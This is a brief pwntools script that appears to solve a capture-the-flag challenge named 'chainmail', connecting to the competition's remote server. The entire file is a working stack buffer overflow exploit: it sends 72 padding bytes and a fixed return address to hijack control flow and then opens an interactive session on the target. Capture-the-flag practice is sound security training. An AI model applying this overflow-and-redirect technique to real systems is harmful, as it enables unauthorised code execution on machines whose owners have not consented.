from pwn import *
context.binary = exe = ELF('./chal')
# io = process()
# gdb.attach(io, api=True)
io = remote('chainmail.chal.uiuc.tf', 1337)
io.recvuntil(b': ')
payload = b'i'*72 + p64(0x40121b)
io.sendline(payload)
io.interactive()